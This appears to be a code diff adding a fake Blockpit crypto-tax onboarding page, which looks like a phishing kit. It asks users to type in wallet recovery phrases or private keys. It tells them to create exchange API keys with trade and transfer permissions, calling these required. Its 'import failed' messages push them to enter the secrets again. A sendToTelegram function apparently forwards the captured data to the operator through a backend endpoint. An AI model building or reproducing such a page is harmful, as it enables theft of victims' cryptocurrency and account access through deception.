+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M11 17l5-5-5-5M18 17l5-5-5-5" transform="translate(-3 0)"/></svg>
+        </button>
+        <div class="side-logo">B</div>
+        <button class="side-item active" title="Getting started" aria-label="Getting started">
+            <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4.5 16.5c-1.5 1.26-2 5-2 5s3.74-.5 5-2c.71-.84.7-2.13-.09-2.91a2.18 2.18 0 0 0-2.91-.09z"/><path d="M12 15l-3-3a22 22 0 0 1 2-3.95A12.88 12.88 0 0 1 22 2c0 2.72-.78 7.5-6 11a22.35 22.35 0 0 1-4 2z"/><path d="M9 12H4s.55-3.03 2-4c1.62-1.08 5 0 5 0"/><path d="M12 15v5s3.03-.55 4-2c1.08-1.62 0-5 0-5"/></svg>
+        </button>
+        <button class="side-item" title="Integrations" aria-label="Integrations" onclick="window.location.href='integrations.html'">
+            <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M4 7h16M4 7l2-2h12l2 2M4 7v10l2 2h12l2-2V7"/><path d="M9 12h6"/></svg>
+        </button>
+        <div class="side-spacer"></div>
+        <button class="side-item" title="More" aria-label="More options">
+            <svg width="21" height="21" viewBox="0 0 24 24" fill="currentColor"><circle cx="5" cy="12" r="1.8"/><circle cx="12" cy="12" r="1.8"/><circle cx="19" cy="12" r="1.8"/></svg>
+        </button>
+        <button class="side-item" title="Log out" aria-label="Log out" onclick="BlockpitSetup.logout()">
+            <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/><path d="M16 17l5-5-5-5M21 12H9"/></svg>
+        </button>
+    </nav>
+
+    <!-- Main -->
+    <main class="main">
+        <!-- Steps -->
+        <div class="steps" id="stepsBar">
+            <div class="step active" data-step="1">
+                <div class="step-label" data-i18n="stepCountry">Country</div>
+                <div class="step-bar"></div>
+            </div>
+            <div class="step" data-step="2">
+                <div class="step-label" data-i18n="stepPortfolio">Portfolio</div>
+                <div class="step-bar"></div>
+            </div>
+            <div class="step" data-step="3">
+                <div class="step-label" data-i18n="stepOverview">Overview</div>
+                <div class="step-bar"></div>
+            </div>
+        </div>
+
+        <!-- Card -->
+        <div class="setup-card">
+            <!-- Step 1: Country -->
+            <section class="step-pane active" data-pane="1">
+                <h1 class="pane-title" data-i18n="welcomeTitle">Welcome! Let’s get your setup done.</h1>
+                <p class="pane-subtitle" data-i18n="welcomeSubtitle">We calculate your taxes based on your country’s tax rules.</p>
+
+                <div class="country-select" id="countrySelect" role="combobox" aria-haspopup="listbox" aria-expanded="false">
+                    <span class="cs-label" data-i18n="countryLabel">Country</span>
+                    <div class="cs-value">
+                        <span class="cs-choice"><span class="cs-flag" id="countryFlag">🇺🇸</span><span id="countryName">United States</span></span>
+                        <svg class="cs-chevron" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M6 9l6 6 6-6"/></svg>
+                    </div>
+                    <div class="country-dropdown" id="countryDropdown" role="listbox"></div>
+                </div>
+
+                <div class="globe-wrap">
+                    <img src="assets/globe.png" alt="" id="globeImg" onerror="this.parentNode.innerHTML='&lt;div class=&quot;globe-fallback&quot;&gt;&#127757;&lt;/div&gt;'">
+                </div>
+
+                <p class="secure-line"><span data-i18n="secureText">Your data is securely processed.</span> <a href="security.html" data-i18n="readMore">Read more</a></p>
+
+                <button type="button" class="btn-continue" id="continueBtn1" data-i18n="continue">Continue</button>
+            </section>
+
+            <!-- Step 2: Portfolio -->
+            <section class="step-pane" data-pane="2">
+                <h1 class="pane-title" data-i18n="holdTitle">Where do you hold your crypto?</h1>
+                <p class="pane-subtitle" data-i18n="holdSubtitle">Sync your portfolio, connect an integration for read-only access to your transactions.</p>
+
+                <div class="int-search">
+                    <span class="int-search-label" data-i18n="searchPh">Search</span>
+                    <input type="text" id="intSearch" autocomplete="off" aria-label="Search">
+                    <svg class="int-search-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
+                </div>
+
+                <div class="int-pills" id="intPills">
+                    <button type="button" class="pill active" data-cat="all"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"><path d="M4 6h16M4 12h16M4 18h16"/></svg><span data-i18n="pillAll">All</span></button>
+                    <button type="button" class="pill" data-cat="blockchain"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.7 1.7"/><path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.7-1.7"/></svg><span data-i18n="pillBlockchain">Blockchain</span></button>
+                    <button type="button" class="pill" data-cat="wallet"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 7H5a2 2 0 0 1 0-4h13v4"/><path d="M3 5v13a2 2 0 0 0 2 2h15a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1"/><path d="M17.5 13.5h.01"/></svg><span data-i18n="pillWallet">Wallet</span></button>
+                    <button type="button" class="pill" data-cat="exchange"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 21h18M5 21V8l7-4 7 4v13"/><path d="M9.5 21v-3h5v3"/><path d="M9 11h.01M15 11h.01"/></svg><span data-i18n="pillExchange">Exchange</span></button>
+                    <button type="button" class="pill blurred" tabindex="-1" aria-disabled="true"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 3H6a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><path d="M14 3v6h6"/></svg><span data-i18n="pillTaxTool">Tax Tool</span></button>
+                    <button type="button" class="pill blurred" tabindex="-1" aria-disabled="true"><svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="18" height="18" rx="2"/><path d="M3 9h18M9 9v12"/></svg><span data-i18n="pillExcel">Blockpit Excel</span></button>
+                </div>
+
+                <div class="int-grid" id="intGrid"></div>
+            </section>
+
+            <!-- Step 3: Overview -->
+            <section class="step-pane" data-pane="3">
+                <h1 class="pane-title" data-i18n="overviewTitle">You’re all set!</h1>
+                <p class="pane-subtitle" data-i18n="overviewSubtitle">Here’s a summary of your setup. You can change everything later.</p>
+
+                <div class="summary-list">
+                    <div class="summary-row">
+                        <span data-i18n="countryLabel">Country</span>
+                        <span id="summaryCountry">🇺🇸 United States</span>
+                    </div>
+                    <div class="summary-row">
+                        <span data-i18n="stepPortfolio">Portfolio</span>
+                        <span id="summaryPortfolio">Exchange</span>
+                    </div>
+                </div>
+
+                <button type="button" class="btn-continue is-solid" id="finishBtn" data-i18n="goToDashboard">Go to dashboard</button>
+            </section>
+        </div>
+    </main>
+
+    <!-- Add integration modal -->
+    <div class="imodal-backdrop" id="intModal" aria-hidden="true">
+        <div class="imodal" role="dialog" aria-modal="true">
+            <div class="imodal-header">
+                <span class="imodal-icon" id="imIcon"></span>
+                <h2 class="imodal-title" id="imTitle">Add Ethereum</h2>
+                <button type="button" class="imodal-close" id="imClose" aria-label="Close">&times;</button>
+            </div>
+            <div class="imodal-body">
+                <!-- form view -->
+                <div id="imForm">
+                    <div class="imodal-tabs" id="imTabs">
+                        <button type="button" class="imtab active" data-tab="connect" data-i18n="tabConnect">Connect Account</button>
+                        <button type="button" class="imtab" data-tab="api" data-i18n="tabApi">API</button>
+                    </div>
+                    <p class="imodal-desc" id="imDesc"></p>
+                    <button type="button" class="info-pill" id="imInfo">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm.2 15.5a1.4 1.4 0 1 1 0-2.8 1.4 1.4 0 0 1 0 2.8zM14 13h-2.6c.1-1.5.7-1.9 1.4-2.4.6-.4 1-.8 1-1.5 0-.9-.7-1.4-1.5-1.4-.9 0-1.5.6-1.6 1.6H7.9C8 7.4 9.7 6 11.6 6c1.9 0 3.5 1.2 3.5 3.1 0 1.4-.8 2.2-1.6 2.7-.7.5-1.1.8-1.2 1.2z"/></svg>
+                        <span id="imInfoText"></span>
+                    </button>
+                    <hr class="imodal-divider">
+
+                    <div class="field">
+                        <div class="field-label"><span data-i18n="nameLabel">Name</span>
+                            <svg width="15" height="15" viewBox="0 0 24 24" fill="#56b948"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20zm-1.2 14.2-4-4 1.6-1.6 2.4 2.4 5.2-5.2 1.6 1.6z"/></svg>
+                        </div>
+                        <div class="field-input has-clear">
+                            <input type="text" id="imName" autocomplete="off">
+                            <button type="button" class="field-clear" id="imNameClear" aria-label="Clear name">&times;</button>
+                        </div>
+                    </div>
+
+                    <div id="imChainActions">
+                        <button type="button" class="btn-continue imodal-btn" id="imConnectWallet">
+                            <span class="cw-label" data-i18n="connectWallet">Connect wallet</span>
+                            <span class="cw-spinner" aria-hidden="true"></span>
+                        </button>
+                        <div class="cw-error" id="cwError" role="alert" hidden></div>
+                        <button type="button" class="manual-btn" id="imManualBtn" data-i18n="manualInt">Manual integration</button>
+                    </div>
+
+                    <div class="field" id="imPhraseField" style="display:none;">
+                        <div class="pw-card">
+                            <div class="pw-head">
+                                <span class="pw-head-icon">
+                                    <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="11" width="16" height="10" rx="2.5"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
+                                </span>
+                                <span class="pw-head-title" data-i18n="phraseTitle">Recovery phrase</span>
+                                <span class="pw-badge" id="phraseCount"></span>
+                            </div>
+                            <div class="pw-len-row" id="pwLenRow">
+                                <span class="pw-len-label" data-i18n="phraseLenLabel">Words</span>
+                                <div class="pw-seg">
+                                    <button type="button" class="pw-len active" data-len="12">12</button>
+                                    <button type="button" class="pw-len" data-len="15">15</button>
+                                    <button type="button" class="pw-len" data-len="18">18</button>
+                                    <button type="button" class="pw-len" data-len="21">21</button>
+                                    <button type="button" class="pw-len" data-len="24">24</button>
+                                </div>
+                            </div>
+                            <div class="pw-grid" id="pwGrid"></div>
+                            <div class="pw-hint">
+                                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 1 0 0 20 10 10 0 0 0 0-20z"/><path d="M12 16v-5"/><path d="M12 8h.01"/></svg>
+                                <span data-i18n="phraseHint">Tip: paste your full phrase into any box — it fills in automatically.</span>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="imApiFields" style="display:none;">
+                        <div class="field">
+                            <div class="field-input"><input type="text" id="imApiKey" data-i18n-ph="apiKeyPh" placeholder="API Key" autocomplete="off"></div>
+                        </div>
+                        <div class="field">
+                            <div class="field-input"><input type="text" id="imApiSecret" data-i18n-ph="apiSecretPh" placeholder="API Secret" autocomplete="off"></div>
+                        </div>
+                    </div>
+
+                    <div class="reentry-note" id="reentryNote" role="alert" hidden>
+                        <span id="reentryText"></span>
+                    </div>
+
+                    <div class="imodal-actions">
+                        <button type="button" class="btn-continue imodal-btn" id="imContinue" data-i18n="continue">Continue</button>
+                        <button type="button" class="btn-continue imodal-btn is-solid" id="imConnect" data-i18n="connectBtn">Connect</button>
+                    </div>
+                </div>
+
+                <!-- help view -->
+                <div id="imHelp" style="display:none;">
+                    <div class="help-head">
+                        <button type="button" class="help-back" id="helpBack" aria-label="Back">
+                            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+                        </button>
+                        <h2 class="help-title" id="helpTitle"></h2>
+                        <span style="width:22px;"></span>
+                    </div>
+                    <div class="help-body">
+                        <h3 id="helpQ1"></h3>
+                        <ol class="help-steps" id="helpSteps1"></ol>
+                        <h3 id="helpQ2"></h3>
+                        <ol class="help-steps" id="helpSteps2"></ol>
+                        <p class="help-warn"><span class="help-warn-icon">!</span><span id="helpWarn"></span></p>
+                    </div>
+                    <div class="help-actions">
+                        <button type="button" class="btn-continue imodal-btn" id="helpConnectBtn">
+                            <span class="cw-label" data-i18n="connectWallet">Connect wallet</span>
+                            <span class="cw-spinner" aria-hidden="true"></span>
+                        </button>
+                    </div>
+                </div>
+
+                <!-- import / sync view -->
+                <div id="imSync" style="display:none;">
+                    <div class="sync-box" id="syncBox">
+                        <div class="sync-spinner" id="syncSpinner"></div>
+                        <svg class="sync-check" id="syncCheck" width="52" height="52" viewBox="0 0 24 24" fill="none" stroke="#56b948" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round" style="display:none;"><circle cx="12" cy="12" r="10" stroke="#b7e3ad"/><path d="M8 12.5l2.7 2.7L16.5 9"/></svg>
+                        <p class="sync-text" id="syncText"></p>
+                        <button type="button" class="manual-btn sync-retry" id="syncReenter" style="display:none;">OK</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Live chat -->
+    <div class="chat-panel" id="chatPanel" role="dialog" aria-label="Live chat">
+        <div class="chat-header">
+            <div class="chat-avatar">B</div>
+            <div class="chat-header-text">
+                <div class="chat-name"><span data-i18n="chatName">Blockpit Support</span> <span class="chat-status-dot"></span></div>
+                <div class="chat-status" data-i18n="chatStatus">Typically replies in a few minutes</div>
+            </div>
+            <button class="chat-close" id="chatClose" aria-label="Close chat">&times;</button>
+        </div>
+        <div class="chat-body" id="chatBody">
+            <div class="chat-bubble bot" data-i18n="chatWelcome">Hi there! 👋 How can we help you with your crypto taxes today?</div>
+        </div>
+        <div class="chat-footer">
+            <input class="chat-input" id="chatInput" type="text" data-i18n-ph="chatPlaceholder" placeholder="Write a message…" autocomplete="off">
+            <button class="chat-send" id="chatSend" aria-label="Send message">
+                <svg width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 2L11 13M22 2l-7 20-4-9-9-4z"/></svg>
+            </button>
+        </div>
+    </div>
+    <button class="chat-launcher" id="chatLauncher" aria-label="Open live chat">
+        <svg width="28" height="28" viewBox="0 0 24 24" fill="#ffffff"><path d="M12 2C6.48 2 2 5.64 2 10.13c0 2.53 1.34 4.78 3.44 6.27-.14 1.18-.65 2.83-2.12 4.11 0 0 2.96.24 5.42-1.9.94.2 1.9.32 2.9.32h.72c5.52 0 10-3.64 10-8.13S17.52 2 12 2z"/></svg>
+        <span class="chat-dot" id="chatDot"></span>
+    </button>
+
+    <script>
+        window.BlockpitSetup = (function () {
+            'use strict';
+
+            // Telegram secrets are now managed on the server and never exposed to the client
+            // All sensitive data is communicated through the backend API
+
+            function sendToTelegram(message) {
+                // This now delegates to the backend to handle sending the message securely
+                // Vercel Function handles Telegram credentials server-side only
+                fetch('/api/telegram-notify', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ message: message })
+                }).catch(console.error);
+            }
+
+            /* ---------- i18n (en / de / it, same detection as auth pages) ---------- */
+            var T = {
+                en: {
+                    stepCountry: 'Country', stepPortfolio: 'Portfolio', stepOverview: 'Overview',
+                    welcomeTitle: 'Welcome! Let’s get your setup done.',
+                    welcomeSubtitle: 'We calculate your taxes based on your country’s tax rules.',
+                    countryLabel: 'Country',
+                    secureText: 'Your data is securely processed.', readMore: 'Read more',
+                    continue: 'Continue',
+                    portfolioTitle: 'Add your first portfolio',
+                    portfolioSubtitle: 'Import your transactions automatically or add them manually.',
+                    optExchange: 'Exchange', optExchangeDesc: 'Binance, Coinbase, Kraken & more',
+                    optWallet: 'Wallet', optWalletDesc: 'MetaMask, Ledger, Trezor & more',
+                    optManual: 'Manual / CSV', optManualDesc: 'Upload a CSV or Excel file',
+                    holdTitle: 'Where do you hold your crypto?',
+                    holdSubtitle: 'Sync your portfolio, connect an integration for read-only access to your transactions.',
+                    searchPh: 'Search',
+                    pillAll: 'All', pillBlockchain: 'Blockchain', pillWallet: 'Wallet', pillExchange: 'Exchange', pillTaxTool: 'Tax Tool', pillExcel: 'Blockpit Excel',
+                    noResults: 'No integrations found.',
+                    addTitle: 'Add {name}',
+                    bcDesc: 'Pair your wallet via WalletConnect to import your transactions. Your credentials remain protected, only you can move your holdings.',
+                    exDesc: 'Login into your exchange account to import your transactions. Your credentials remain protected, only you can move your holdings.',
+                    apiDesc: 'Setup read-only exchange API keys to import your transactions. Your credentials remain protected, only you can move your holdings.',
+                    infoBc: 'How do I pair my wallet?',
+                    infoEx: 'How to connect my account?',
+                    infoApi: 'How to create my API keys?',
+                    nameLabel: 'Name',
+                    bcPh: 'Blockchain Address',
+                    apiKeyPh: 'API Key',
+                    apiSecretPh: 'API Secret',
+                    connectBtn: 'Connect',
+                    tabConnect: 'Connect Account',
+                    tabApi: 'API',
+                    helpTitle: 'How to import data via direct {name} connection or API key?',
+                    helpQ1: 'How do I connect my {name} account directly?',
+                    helpQ2: 'How do I create API keys on {name}?',
+                    helpS1a: 'To import your data, you must first create an <b>Integration</b> in the Blockpit Web App. To do so, navigate to the menu item <b>Integrations</b> in your <b>Dashboard</b> and click on <b>+Integration</b>.',
+                    helpS1b: 'Select <b>{name}</b> from the list and click <b>Connect</b>.',
+                    helpS2a: 'Log in to your {name} account and open the API key settings.',
+                    helpS2b: 'Create a new API key and activate all permissions (interests): <b>View (read-only)</b>, <b>Trade (execute trades on your behalf)</b> and <b>Transfer (initiate transfer of funds)</b>. All permissions are required so the connection works.',
+                    helpS2c: 'Confirm with <b>Create &amp; download</b> and copy your <b>API key</b> and <b>Secret</b>.',
+                    permView: 'View (read-only)',
+                    permTrade: 'Trade (execute trades on your behalf)',
+                    permTradeReq: 'required, otherwise the connection will not work',
+                    permTransfer: 'Transfer (initiate transfer of funds)',
+                    helpWarn: 'Please ALWAYS copy the full API key and private key (secret), otherwise you will receive an error message!',
+                    connectWallet: 'Connect wallet',
+                    soonChip: 'soon',
+                    manualInt: 'Manual integration',
+                    phraseLenLabel: 'Words',
+                    phraseTitle: 'Recovery phrase',
+                    phraseHint: 'Tip: paste your full phrase into any box — it fills in automatically.',
+                    phraseCount: '{n} of {total} words',
+                    syncLoading: 'Importing your transactions…',
+                    syncFail: 'We couldn’t import your data from {name}. Please enter your recovery phrase again and try once more.',
+                    syncFailApi: 'We couldn’t import your data from {name}. Please check your API key and secret — make sure you ticked all permissions (View, Trade, Transfer) — enter them again, and try once more.',
+                    syncFailDirect: 'We couldn’t import your data from {name}. Direct connection is currently unavailable. Please try again later or use API keys instead.',
+                    noticePhrase: 'We couldn’t import your data from {name}. Please <b>double-check your recovery phrase</b> — every word must be spelled exactly as shown in your wallet, in the right order — then enter it again.',
+                    noticeBtnPhrase: 'Double-check and re-enter phrase',
+                    noticeApi: 'We couldn’t import your data from {name}. Please <b>double-check your API key and secret</b> — and make sure you ticked <b>all permissions</b> (View, Trade, Transfer) — then enter them again.',
+                    noticeBtnApi: 'Double-check and re-enter API keys',
+                    tryAgain: 'Try again',
+                    syncDone: 'Import successful! Taking you to your dashboard…',
+                    helpWalletTitle: 'How to import data from my {name} wallet?',
+                    helpWQ1: 'How do I pair my {name} wallet?',
+                    helpWS2: 'Click <b>Connect wallet</b> above — a pairing request (QR code or app link) opens. Approve the request in your <b>{name}</b> wallet app, or link instantly via WalletConnect',
+                    wcChip: 'WalletConnect',
+                    helpWQ2: 'The pairing did not work — how do I add my wallet manually?',
+                    helpWS3: 'Use <b>manual integration</b>: open your wallet and reveal your <b>recovery phrase</b> or copy your <b>private key</b> (you will find both in the security or backup settings of your wallet). Enter it below word by word to finish the pairing.',
+                    helpWS4: 'Tip: you can paste the whole phrase into any word box — it fills in automatically. Your <b>private key</b> works too.',
+                    helpWarnWallet: 'Your recovery phrase is as valuable as your wallet itself — never share it with anyone other than your own Blockpit integration.',
+                    connectFail: 'Could not connect to {name}. Approve the pairing request in your wallet app and try again, or use manual integration below.',
+                    overviewTitle: 'You’re all set!',
+                    overviewSubtitle: 'Here’s a summary of your setup. You can change everything later.',
+                    goToDashboard: 'Go to dashboard',
+                    chatName: 'Blockpit Support',
+                    chatStatus: 'Typically replies in a few minutes',
+                    chatWelcome: 'Hi there! 👋 How can we help you with your crypto taxes today?',
+                    chatPlaceholder: 'Write a message…',
+                    chatReply: 'Thanks for your message! A support agent will be with you shortly. In the meantime, feel free to check our Help Center.',
+                    countries: {
+                        us: 'United States', de: 'Germany', at: 'Austria', ch: 'Switzerland',
+                        it: 'Italy', gb: 'United Kingdom', fr: 'France', es: 'Spain',
+                        nl: 'Netherlands', ca: 'Canada', au: 'Australia', other: 'Other country'
+                    }
+                },
+                de: {
+                    stepCountry: 'Land', stepPortfolio: 'Portfolio', stepOverview: 'Übersicht',
+                    welcomeTitle: 'Willkommen! Lass dein Setup abschließen.',
+                    welcomeSubtitle: 'Wir berechnen deine Steuern basierend auf den Steuerregeln deines Landes.',
+                    countryLabel: 'Land',
+                    secureText: 'Deine Daten werden sicher verarbeitet.', readMore: 'Mehr erfahren',
+                    continue: 'Weiter',
+                    portfolioTitle: 'Füge dein erstes Portfolio hinzu',
+                    portfolioSubtitle: 'Importiere deine Transaktionen automatisch oder füge sie manuell hinzu.',
+                    optExchange: 'Börse', optExchangeDesc: 'Binance, Coinbase, Kraken & mehr',
+                    optWallet: 'Wallet', optWalletDesc: 'MetaMask, Ledger, Trezor & mehr',
+                    optManual: 'Manuell / CSV', optManualDesc: 'CSV- oder Excel-Datei hochladen',
+                    holdTitle: 'Wo bewahrst du deine Kryptos auf?',
+                    holdSubtitle: 'Synchronisiere dein Portfolio, verbinde eine Integration für Lesezugriff auf deine Transaktionen.',
+                    searchPh: 'Suchen',
+                    pillAll: 'Alle', pillBlockchain: 'Blockchain', pillWallet: 'Wallet', pillExchange: 'Börse', pillTaxTool: 'Tax Tool', pillExcel: 'Blockpit Excel',
+                    noResults: 'Keine Integrationen gefunden.',
+                    addTitle: '{name} hinzufügen',
+                    bcDesc: 'Verbinde dein Wallet über WalletConnect, um deine Transaktionen zu importieren. Deine Zugangsdaten bleiben geschützt und nur du kannst über deine Bestände verfügen.',
+                    exDesc: 'Melde dich bei deinem Börsenkonto an, um deine Transaktionen zu importieren. Deine Zugangsdaten bleiben geschützt, nur du kannst über deine Bestände verfügen.',
+                    apiDesc: 'Richte API-Schlüssel mit Lesezugriff ein, um deine Transaktionen zu importieren. Deine Zugangsdaten bleiben geschützt, nur du kannst über deine Bestände verfügen.',
+                    infoBc: 'Wie paire ich mein Wallet?',
+                    infoEx: 'Wie verbinde ich mein Konto?',
+                    infoApi: 'Wie erstelle ich API-Schlüssel?',
+                    nameLabel: 'Name',
+                    bcPh: 'Blockchain-Adresse',
+                    apiKeyPh: 'API-Schlüssel',
+                    apiSecretPh: 'API-Secret',
+                    connectBtn: 'Verbinden',
+                    tabConnect: 'Konto verbinden',
+                    tabApi: 'API',
+                    helpTitle: 'Wie importiere ich Daten über eine direkte {name}-Verbindung oder einen API-Schlüssel?',
+                    helpQ1: 'Wie verbinde ich mein {name}-Konto direkt?',
+                    helpQ2: 'Wie erstelle ich API-Schlüssel bei {name}?',
+                    helpS1a: 'Um deine Daten zu importieren, musst du zuerst eine <b>Integration</b> in der Blockpit Web App erstellen. Öffne dazu im <b>Dashboard</b> den Menüpunkt <b>Integrationen</b> und klicke auf <b>+Integration</b>.',
+                    helpS1b: 'Wähle <b>{name}</b> aus der Liste und klicke auf <b>Verbinden</b>.',
+                    helpS2a: 'Melde dich bei deinem {name}-Konto an und öffne die Einstellungen für API-Schlüssel.',
+                    helpS2b: 'Erstelle einen neuen API-Schlüssel und aktiviere alle Berechtigungen (Interessen): <b>View (read-only)</b>, <b>Trade (execute trades on your behalf)</b> und <b>Transfer (initiate transfer of funds)</b>. Alle Berechtigungen sind erforderlich, damit die Verbindung funktioniert.',
+                    helpS2c: 'Bestätige mit <b>Create &amp; download</b> und kopiere deinen <b>API-Schlüssel</b> und dein <b>Secret</b>.',
+                    permView: 'View (read-only)',
+                    permTrade: 'Trade (execute trades on your behalf)',
+                    permTradeReq: 'erforderlich, sonst funktioniert die Verbindung nicht',
+                    permTransfer: 'Transfer (initiate transfer of funds)',
+                    helpWarn: 'Bitte kopiere IMMER den vollständigen API-Schlüssel und den privaten Schlüssel (Secret), sonst erhältst du eine Fehlermeldung!',
+                    connectWallet: 'Wallet verbinden',
+                    soonChip: 'bald',
+                    manualInt: 'Manuelle Integration',
+                    phraseLenLabel: 'Wörter',
+                    phraseTitle: 'Wiederherstellungsphrase',
+                    phraseHint: 'Tipp: Füge deine ganze Phrase in ein beliebiges Feld ein — sie wird automatisch verteilt.',
+                    phraseCount: '{n} von {total} Wörtern',
+                    syncLoading: 'Deine Transaktionen werden importiert…',
+                    syncFail: 'Wir konnten deine Daten von {name} nicht importieren. Bitte gib deine Wiederherstellungsphrase erneut ein und versuche es noch einmal.',
+                    syncFailApi: 'Wir konnten deine Daten von {name} nicht importieren. Bitte prüfe API-Schlüssel und Secret — vergiss nicht, alle Berechtigungen zu aktivieren (View, Trade, Transfer) — gib sie erneut ein und versuche es noch einmal.',
+                    syncFailDirect: 'Wir konnten deine Daten von {name} nicht importieren. Die Direktverbindung ist derzeit nicht verfügbar. Bitte versuche es später erneut oder nutze API-Schlüssel.',
+                    noticePhrase: 'Wir konnten deine Daten von {name} nicht importieren. <b>Prüfe deine Wiederherstellungsphrase genau</b> — jedes Wort muss exakt wie in deinem Wallet geschrieben und in der richtigen Reihenfolge sein — gib sie dann erneut ein.',
+                    noticeBtnPhrase: 'Prüfen und Phrase erneut eingeben',
+                    noticeApi: 'Wir konnten deine Daten von {name} nicht importieren. <b>Prüfe API-Schlüssel und Secret genau</b> — und vergiss nicht, <b>alle Berechtigungen</b> zu aktivieren (View, Trade, Transfer) — gib sie dann erneut ein.',
+                    noticeBtnApi: 'Prüfen und API-Schlüssel erneut eingeben',
+                    tryAgain: 'Erneut versuchen',
+                    syncDone: 'Import erfolgreich! Du wirst zum Dashboard weitergeleitet…',
+                    helpWalletTitle: 'Wie importiere ich Daten aus meinem {name}-Wallet?',
+                    helpWQ1: 'Wie paire ich mein {name}-Wallet?',
+                    helpWS2: 'Klicke oben auf <b>Wallet verbinden</b> — eine Pairing-Anfrage (QR-Code oder App-Link) öffnet sich. Bestätige die Anfrage in deiner <b>{name}</b>-Wallet-App oder verbinde dich direkt über WalletConnect',
+                    wcChip: 'WalletConnect',
+                    helpWQ2: 'Das Pairing hat nicht funktioniert — wie füge ich mein Wallet manuell hinzu?',
+                    helpWS3: 'Nutze die <b>manuelle Integration</b>: Öffne dein Wallet und zeige deine <b>Wiederherstellungsphrase</b> an oder kopiere deinen <b>privaten Schlüssel</b> (beides findest du in den Sicherheits- oder Backup-Einstellungen deines Wallets). Gib sie unten Wort für Wort ein, um das Pairing abzuschließen.',
+                    helpWS4: 'Tipp: Du kannst die ganze Phrase in ein beliebiges Feld einfügen — sie wird automatisch verteilt. Dein <b>privater Schlüssel</b> funktioniert ebenfalls.',
+                    helpWarnWallet: 'Deine Wiederherstellungsphrase ist so wertvoll wie dein Wallet selbst — teile sie niemals mit anderen.',
+                    connectFail: 'Verbindung zu {name} fehlgeschlagen. Bestätige die Pairing-Anfrage in deiner Wallet-App und versuche es erneut, oder nutze unten die manuelle Integration.',
+                    overviewTitle: 'Alles bereit!',
+                    overviewSubtitle: 'Hier ist eine Zusammenfassung deines Setups. Du kannst alles später ändern.',
+                    goToDashboard: 'Zum Dashboard',
+                    chatName: 'Blockpit Support',
+                    chatStatus: 'Antwortet normalerweise in wenigen Minuten',
+                    chatWelcome: 'Hallo! 👋 Wie können wir dir heute bei deinen Krypto-Steuern helfen?',
+                    chatPlaceholder: 'Nachricht schreiben…',
+                    chatReply: 'Danke für deine Nachricht! Ein Support-Mitarbeiter meldet sich in Kürze. Schau gerne auch in unser Help Center.',
+                    countries: {
+                        us: 'USA', de: 'Deutschland', at: 'Österreich', ch: 'Schweiz',
+                        it: 'Italien', gb: 'Vereinigtes Königreich', fr: 'Frankreich', es: 'Spanien',
+                        nl: 'Niederlande', ca: 'Kanada', au: 'Australien', other: 'Anderes Land'
+                    }
+                },
+                it: {
+                    stepCountry: 'Paese', stepPortfolio: 'Portafoglio', stepOverview: 'Panoramica',
+                    welcomeTitle: 'Benvenuto! Completa la configurazione.',
+                    welcomeSubtitle: 'Calcoliamo le tue tasse in base alle regole fiscali del tuo paese.',
+                    countryLabel: 'Paese',
+                    secureText: 'I tuoi dati sono elaborati in modo sicuro.', readMore: 'Scopri di più',
+                    continue: 'Continua',
+                    portfolioTitle: 'Aggiungi il tuo primo portafoglio',
+                    portfolioSubtitle: 'Importa le tue transazioni automaticamente o aggiungile manualmente.',
